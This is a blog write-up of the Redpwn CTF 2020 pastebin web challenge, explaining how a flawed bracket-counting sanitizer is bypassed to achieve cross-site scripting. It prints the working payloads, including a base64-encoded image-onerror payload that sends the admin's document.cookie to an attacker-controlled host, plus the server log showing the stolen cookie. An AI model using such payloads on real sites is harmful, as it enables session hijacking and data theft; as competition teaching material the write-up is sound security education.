---
layout: "post"
title: "Redpwn CTF 2020 - Web Pastebin challenge writeup"
date: "2020-06-27 14:24:29"
date_gmt: "2020-06-27 14:24:29"
modified: "2020-06-27 14:24:29"
modified_gmt: "2020-06-27 14:24:29"
slug: "redpwn-ctf-2020-web-pastebin-challenge-writeup"
author: "brandonshi123"
status: "publish"
type: "post"
original_url: "https://y4y.space/2020/06/27/redpwn-ctf-2020-web-pastebin-challenge-writeup/"
guid: "http://y4y.space/?p=83"
wordpress_id: 83
parent_id: 0
categories: ["Uncategorized"]
---

The same write should also be up on the Pwnie Island's team[blog](https://www.pwnie-island.org/).

Challenge address, https://2020.redpwn.net/challs

![](https://y4y.space/wp-content/uploads/2020/06/screenshot-from-2020-06-27-07-08-00.png?w=909)

So we were given two links, the first link lead us to a page where we can send urls to admin so the admin can check our message, the second link is like a static pastebin page which allows us to generate message. Based on the descriptions, the goal and attack vector is clear: Cross Site Scripting (XSS).

Next is to figure out if there is any filtering process for user inputs, so I first used the infamous XSS payload `<script>alert(1);</script>`

![](https://y4y.space/wp-content/uploads/2020/06/screenshot-from-2020-06-27-07-11-46.png?w=564)

and the page returned

![](https://y4y.space/wp-content/uploads/2020/06/screenshot-from-2020-06-27-07-11-54.png?w=215)

so obviously there is some kinds of filtering, the next step is to find out how the page is filtering my message, I checked around and found out "script.js", which has the following code:

```
(async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });

    const content = window.location.hash.substring(1);
    display(atob(content));
})();

function display(input) {
    document.getElementById('paste').innerHTML = clean(input);
}

function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}
```

the clean function is what filters out my message, and there is a flaw in it. Notice that when the code  `if (brackets == 0)` is being executed, it adds the current character to the final string, so if we can somehow make brackets has the value of -1 when the coding is trying to do the comparison, we can append the special character to the final message. So let's try  `><script>alert(1);`, and it works, but now another problem is to figure the closing tag. We don't need to do all those work, though. We can just use a single tag entity like `<img>` or `<svg>`. In our case, I used img for specifically no reason.

Then I tried to test my payload:

```
><img src="x" onerror="alert(1);">
```

which works like a charm. Next let's do some more dangerous payload, to make sure everything works I used the eval() function, which takes in a string and evaluate the string as JS code. Here is my finaly payload:

```
><img src="x" onerror="eval(atob(bmV3IEltYWdlKCkuc3JjPWh0dHA6Ly9sb2NhbGhvc3QvY29va2llLnBocD9jPStkb2N1bWVudC5jb29raWU7Cg==))">
```

atob() is another JS function which decodes base64 encoded string, and note the payload I put above is using the address of localhost instead of the public IP machine I owned. After generating the message and sending the url to admin, I got the flag.

107.178.229.206 - - [26/Jun/2020 11:37:29] "GET /cookie.php?c=flag=flag{54n1t1z4t10n_k1nd4_h4rd} HTTP/1.1" 404 -
